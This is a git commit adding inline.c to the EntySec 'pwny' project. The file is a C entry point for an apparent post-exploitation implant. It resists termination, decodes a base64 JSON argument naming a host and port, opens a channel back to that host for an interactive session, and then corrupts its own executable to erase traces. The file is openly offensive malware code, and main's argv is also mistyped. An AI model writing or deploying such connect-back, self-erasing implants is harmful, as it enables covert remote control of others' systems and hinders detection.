701298213c25e845b1e2b3f05bb7bd9abf6e38f5
Ivan Nikolsky <enty8080@gmail.com>
2022-01-16 03:14:18 +0300

    Create inline.c

---
+++ src/pwny/inline.c
@@ -0,0 +1,59 @@
+/*
+* MIT License
+*
+* Copyright (c) 2020-2022 EntySec
+*
+* Permission is hereby granted, free of charge, to any person obtaining a copy
+* of this software and associated documentation files (the "Software"), to deal
+* in the Software without restriction, including without limitation the rights
+* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+* copies of the Software, and to permit persons to whom the Software is
+* furnished to do so, subject to the following conditions:
+*
+* The above copyright notice and this permission notice shall be included in all
+* copies or substantial portions of the Software.
+*
+* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+* SOFTWARE.
+*/
+
+#define _GNU_SOURCE
+
+#include <string.h>
+#include <stdlib.h>
+
+#include "json.h"
+#include "utils.h"
+#include "base64.h"
+
+#include "channel.h"
+#include "console.h"
+
+int main(int argc, char *argv)
+{
+    prevent_termination();
+
+    if (argc < 2)
+        return -1;
+
+    char *input = decode_base64(argv[1]);
+    JSONObject *json = parseJSON(input);
+
+    char *host = find_json(json, "host");
+    char *port = find_json(json, "port");
+
+    int channel = open_channel(host, atoi(port));
+    if (channel < 0)
+        return -1;
+
+    interact(channel);
+    close_channel(channel);
+
+    self_corrupt(argv[0]);
+    return 0;
+}
